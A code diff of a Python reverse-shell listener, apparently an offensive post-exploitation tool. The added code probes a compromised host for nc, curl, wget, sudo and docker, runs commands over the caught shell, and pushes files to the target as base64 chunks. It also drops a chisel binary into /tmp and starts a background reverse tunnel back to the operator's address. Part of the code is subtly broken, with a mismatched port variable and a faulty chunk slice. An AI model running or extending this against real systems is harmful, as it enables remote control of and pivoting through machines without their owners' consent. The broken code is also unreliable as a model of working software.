@@ -1,12 +1,14 @@
 #!/usr/bin/python
 
 import socket
+import os
 import sys
 import pty
 import util
 import time
 import random
 import threading
+import paramiko
 import readline
 import base64
 
@@ -17,15 +19,29 @@ class ShellListener:
         self.bind_addr = addr
         self.port = port
         self.verbose = False
-        self.on_message = None
+        self.on_message = []
         self.listen_thread = None
         self.connection = None
         self.on_connect = None
+        self.features = set()
 
     def startBackground(self):
         self.listen_thread = threading.Thread(target=self.start)
         self.listen_thread.start()
         return self.listen_thread
+
+    def has_feature(self, feature):
+        return feature.lower() in self.features
+
+    def probe_features(self):
+        features = ["wget", "curl", "nc", "sudo", "telnet", "docker", "python"]
+        for feature in features:
+            output = self.exec_sync("whereis " + feature)
+            if output.startswith(feature.encode() + b": ") and len(output) >= len(feature)+2:
+                self.features.add(feature.lower())
+            
+    def get_features(self):
+        return self.features
 
     def start(self):
         self.running = True
@@ -46,8 +62,8 @@ class ShellListener:
                         break
                     if self.verbose:
                         print("< ", data)
-                    if self.on_message:
-                        self.on_message(data)
+                    for callback in self.on_message:
+                        callback(data)
                         
             print("[-] Disconnected")
             self.connection = None
@@ -73,12 +89,42 @@ class ShellListener:
         data += b"\n"
         return self.send(data)
 
+    def exec_sync(self, cmd):
+        output = b""
+        complete = False
+
+        if isinstance(cmd, str):
+            cmd = cmd.encode()
+
+        def callback(data):
+            nonlocal output
+            nonlocal complete
+
+            if complete:
+                return
+
+            output += data
+            if data.endswith(b"# ") or data.endswith(b"$ "):
+                complete = True
+                if b"\n" in output:
+                    output = output[0:output.rindex(b"\n")]
+                if output.startswith(cmd + b"\n"):
+                    output = output[len(cmd)+1:]
+        
+        self.on_message.append(callback)
+        self.sendline(cmd)
+        while not complete:
+            time.sleep(0.1)
+        
+        self.on_message.remove(callback)
+        return output
+
     def print_message(self, data):
         sys.stdout.write(data.decode())
         sys.stdout.flush()
 
     def interactive(self):
-        self.on_message = lambda x: self.print_message(x)
+        self.on_message.append(lambda x: self.print_message(x))
         while self.running and self.connection is not None:
             self.sendline(input())
 
@@ -87,7 +133,36 @@ class ShellListener:
             time.sleep(0.1)
         return self.running
 
-def generatePayload(type, local_address, port, index=None):
+    def write_file(self, path, data_or_fd, permissions=None):
+
+        def write_chunk(chunk, first=False):
+            # assume this is unix
+            chunk = base64.b64encode(chunk).decode()
+            operator = ">" if first else ">>"
+            self.sendline(f"echo {chunk}|base64 -d {operator} {path}")
+
+        chunk_size = 1024
+        if hasattr(data_or_fd, "read"):
+            first = True
+            while True:
+                data = data_or_fd.read(chunk_size)
+                if not data:
+                    break
+                if isinstance(data, str):
+                    data = data.encode()
+                write_chunk(data, first)
+                first = False
+            data_or_fd.close()
+        else:
+            if isinstance(data_or_fd, str):
+                data_or_fd = data_or_fd.encode()
+            for offset in range(0, len(data_or_fd), chunk_size):
+                write_chunk(data_or_fd[offset:chunk_size], offset == 0)
+
+        if permissions:
+            self.sendline(f"chmod {permissions} {path}")
+
+def generate_payload(type, local_address, port, index=None):
 
     commands = []
 
@@ -127,7 +202,7 @@ def generatePayload(type, local_address, port, index=None):
 def spawn_listener(port):
     pty.spawn(["nc", "-lvvp", str(port)])
 
-def triggerShell(func, port):
+def trigger_shell(func, port):
     def _wait_and_exec():
         time.sleep(1.5)
         func()
@@ -135,13 +210,37 @@ def triggerShell(func, port):
     threading.Thread(target=_wait_and_exec).start()
     spawn_listener(port)
 
-def triggerShellBackground(func, port):   
+def trigger_background_shell(func, port):   
     listener = ShellListener("0.0.0.0", port)
     listener.startBackground()
     threading.Thread(target=func).start()
     while listener.connection is None:
         time.sleep(0.5)
     return listener
+
+def create_tunnel(shell, ports: list):
+    if len(ports) == 0:
+        print("[-] Need at least one port to tunnel")
+        return
+    
+    # TODO: ports
+
+    if isinstance(shell, ShellListener):
+        # TODO: if chisel has not been transmitted yet
+        # we need a exec sync function, but this requires guessing when the output ended or we need to know the shell prompt
+        ipAddress = util.get_address()
+        chiselPort = 3000
+        chisel_path = os.path.join(os.path.dirname(__file__), "chisel64")
+        shell.write_file("/tmp/chisel64", open(chisel_path, "rb"))
+        shell.sendline("chmod +x /tmp/chisel64")
+
+        t = threading.Thread(target=os.system, args=(f"{chisel_path} server --port {chisel_port} --reverse", ))
+        t.start()
+
+        shell.sendline(f"/tmp/chisel64 client --max-retry-count 1 {ipAddress}:{chiselPort} {ports} 2>&1 >/dev/null &")
+    elif isinstance(shell, paramiko.SSHClient):
+        # TODO: https://github.com/paramiko/paramiko/blob/88f35a537428e430f7f26eee8026715e357b55d6/demos/forward.py#L103
+        pass
 
 if __name__ == "__main__":
 
@@ -152,7 +251,7 @@ if __name__ == "__main__":
     listen_port = None if len(sys.argv) < 3 else int(sys.argv[2])
     payload_type = sys.argv[1].lower()
 
-    local_address = util.getAddress()
+    local_address = util.get_address()
 
     # choose random port
     if listen_port is None:
@@ -160,7 +259,7 @@ if __name__ == "__main__":
         while util.isPortInUse(listen_port):
             listen_port = random.randint(10000,65535)
 
-    payload = generatePayload(payload_type, local_address, listen_port)
+    payload = generate_payload(payload_type, local_address, listen_port)
 
     if payload is None:
         print("Unknown payload type: %s" % payload_type)
